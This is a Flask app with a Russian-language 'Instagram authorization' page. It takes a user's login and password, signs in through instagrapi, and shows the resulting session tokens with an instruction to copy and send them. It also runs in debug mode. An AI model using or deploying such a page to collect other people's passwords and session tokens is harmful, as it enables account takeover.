from flask import Flask, request, jsonify, render_template_string
from instagrapi import Client
import json

app = Flask(__name__)

def create_session(username, password):
    """Создает сессию и возвращает её в виде текста."""
    cl = Client()
    try:
        cl.login(username, password)
        print("Авторизация успешна!")
        # Сохраняем сессию в виде словаря
        session_data = cl.get_settings()
        return json.dumps(session_data)  # Возвращаем сессию в виде JSON-строки
    except Exception as e:
        print(f"Ошибка авторизации: {e}")
        return None

@app.route("/")
def index():
    """Отображает HTML-страницу."""
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Авторизация Instagram</title>
        <style>
            /* Основные стили */
            body {
                font-family: 'Arial', sans-serif;
                margin: 0;
                padding: 0;
                background-color: #057DBC;
                color: white;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }

            .container {
                background: white;
                padding: 2rem;
                border-radius: 10px;
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
                width: 90%;
                max-width: 400px;
                text-align: center;
                margin: 1rem;
            }

            h1 {
                color: #057DBC;
                margin-bottom: 1.5rem;
                font-size: 1.8rem;
            }

            input, button {
                width: calc(100% - 2rem); /* Учитываем отступы */
                padding: 0.75rem;
                margin: 0.5rem 0;
                border: 1px solid #ccc;
                border-radius: 5px;
                font-size: 1rem;
            }

            input:focus {
                outline: none;
                border-color: #057DBC;
                box-shadow: 0 0 5px rgba(5, 125, 188, 0.5);
            }

            button {
                background-color: #057DBC;
                color: white;
                border: none;
                cursor: pointer;
                transition: background-color 0.3s ease;
            }

            button:hover {
                background-color: #045a8a;
            }

            .output {
                margin-top: 1.5rem;
                padding: 1rem;
                background: #f4f4f4;
                border: 1px solid #ccc;
                border-radius: 5px;
                color: #333;
                text-align: left;
                display: none;
            }

            textarea {
                width: calc(100% - 2rem); /* Учитываем отступы */
                padding: 0.75rem;
                border: 1px solid #ccc;
                border-radius: 5px;
                font-size: 1rem;
                resize: none;
                margin-top: 0.5rem;
            }

            .copy-button {
                background-color: #057DBC;
                color: white;
                border: none;
                padding: 0.5rem 1rem;
                border-radius: 5px;
                cursor: pointer;
                margin-top: 0.5rem;
                transition: background-color 0.3s ease;
            }

            .copy-button:hover {
                background-color: #045a8a;
            }

            /* Адаптивность для мобильных устройств */
            @media (max-width: 480px) {
                .container {
                    padding: 1rem;
                    margin: 1rem;
                }

                h1 {
                    font-size: 1.5rem;
                }

                input, button {
                    padding: 0.5rem;
                    font-size: 0.9rem;
                }

                textarea {
                    padding: 0.5rem;
                    font-size: 0.9rem;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Авторизация Instagram</h1>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Логин" required>
                <input type="password" id="password" placeholder="Пароль" required>
                <button type="submit">Авторизоваться</button>
            </form>
            <div id="output" class="output">
                <p>Скопируйте этот текст и отправьте его:</p>
                <textarea id="sessionText" rows="10" readonly></textarea>
                <button class="copy-button" onclick="copyToClipboard()">Скопировать в буфер обмена</button>
            </div>
        </div>

        <script>
            document.getElementById("loginForm").addEventListener("submit", async (e) => {
                e.preventDefault();

                const username = document.getElementById("username").value;
                const password = document.getElementById("password").value;

                const response = await fetch("/login", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({ username, password }),
                });

                const result = await response.json();

                if (result.session) {
                    document.getElementById("sessionText").value = result.session;
                    document.getElementById("output").style.display = "block";
                } else {
                    alert(result.error || "Ошибка авторизации");
                }
            });

            function copyToClipboard() {
                const textarea = document.getElementById("sessionText");
                textarea.select();
                document.execCommand("copy");
                alert("Текст скопирован в буфер обмена!");
            }
        </script>
    </body>
    </html>
    """)

@app.route("/login", methods=["POST"])
def login():
    """Обрабатывает запрос на авторизацию."""
    data = request.json
    username = data.get("username")
    password = data.get("password")

    if not username or not password:
        return jsonify({"error": "Логин и пароль обязательны"}), 400

    session_text = create_session(username, password)
    if session_text:
        return jsonify({"session": session_text})
    else:
        return jsonify({"error": "Ошибка авторизации"}), 401

if __name__ == "__main__":
    app.run(debug=True)